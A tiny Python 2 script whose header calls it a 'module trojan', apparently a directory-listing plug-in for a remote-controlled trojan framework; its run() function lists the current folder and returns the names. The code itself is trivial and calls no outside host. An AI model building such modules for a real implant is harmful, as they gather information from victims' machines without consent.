##
# script for new module trojan in Python
#@autor Jerome Themee - security analyst
#@ 15/07/2015
##
import os

def run(**args):
	
	print "[*] Dir listener module]."
	files = os.listdir(".")
	print files
	return str(files)

print "dsd"